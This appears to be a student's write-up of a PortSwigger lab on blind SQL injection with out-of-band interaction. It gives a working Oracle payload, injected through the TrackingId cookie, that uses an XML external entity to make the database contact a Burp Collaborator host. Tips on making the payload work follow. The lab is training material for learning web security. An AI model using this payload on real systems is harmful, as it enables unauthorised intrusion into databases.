# Lab: Blind SQL injection with out-of-band interaction

My burp collaborator subdomain: `http://pf8i82tajkqo41185xplknhm1d74vt.burpcollaborator.net`

### Try DNS payload for each type of db server
See: https://portswigger.net/web-security/sql-injection/cheat-sheet#time-delays

Perform sqli in the `TrackingId` cookie parameter


Oracle Payload:

`' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://pf8i82tajkqo41185xplknhm1d74vt.burpcollaborator.net"> %remote;]>'),'/l') FROM dual)--`


The above triggered a DNS lookup to my collaborator subdomain, lab solved!

### Notes
* Make sure to encase the SELECT statement with parentheses
* Include protocol in your burp collaborator subdomain (`http://`)
* Make sure to url encode your payload